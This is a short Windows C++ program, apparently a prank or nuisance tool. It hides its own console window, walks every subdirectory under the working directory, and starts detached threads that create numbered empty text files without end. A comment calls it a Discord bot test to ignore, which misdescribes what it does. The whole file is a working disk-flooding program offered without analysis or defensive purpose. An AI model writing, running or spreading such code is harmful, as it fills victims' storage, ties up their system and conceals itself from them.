#include <iostream>
#include <dirent.h> 
#include <cstring>
#include <io.h>
#include <vector>
#include <fstream>
#include <sstream>
#include <windows.h>
#include <thread>

//testing my discord bot, just ignore this
void Copy_A(const std::string &subdir_path)
{
    std::ostringstream oss;
    std::ofstream file;
    int i = 1;
    while (true)
    {
        i++;
        oss << subdir_path << "\\" << i << ".txt";
        file.open(oss.str());
        oss.str("");
        file.close();
    }
}

void iterate_subdirs(const std::string &dir_path, std::vector<std::string> &dirs)
{
    std::string search_path = dir_path + "\\*";
    intptr_t handle;
    _finddata_t file_info;

    handle = _findfirst(search_path.c_str(), &file_info);
    if (handle == -1)
    {
        std::cerr << "Error: unable to open directory " << dir_path << std::endl;
        return;
    }

    do
    {
        std::string name = file_info.name;
        if (name == "." || name == "..")
        {
            continue;
        }

        std::string subdir_path = dir_path + "\\" + name;

        if (file_info.attrib & _A_SUBDIR)
        {
            std::cout << "Found subdirectory: " << subdir_path << std::endl;
            dirs.push_back(subdir_path); // add subdir_path to the vector
            iterate_subdirs(subdir_path, dirs);
            // create a new thread for Copy_A() and pass the subdirectory to it
            std::thread t(Copy_A, subdir_path);
            t.detach(); // detach the thread so it runs independently
        }
    } while (_findnext(handle, &file_info) == 0);

    _findclose(handle);
}

int main()
{
    char cwd[256];
    std::string str = getcwd(cwd,sizeof(cwd));
    std::vector<std::string> dirs;
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
    iterate_subdirs(str, dirs);
    while(true){}
}